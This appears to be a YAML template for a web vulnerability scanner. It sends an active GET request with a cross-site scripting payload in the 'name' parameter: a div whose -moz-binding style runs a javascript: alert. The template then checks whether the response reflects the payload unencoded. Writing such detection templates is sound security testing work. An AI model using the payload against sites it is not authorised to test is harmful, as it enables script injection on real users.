id: xss4-073
name: 'Raw XSS4 #32 in name'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in name'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      name:
        - '<div style="-moz-binding:url(''javascript:alert(nx4072)'')">'
    matchers:
      - type: word
        part: body
        words:
          - 'nx4072'
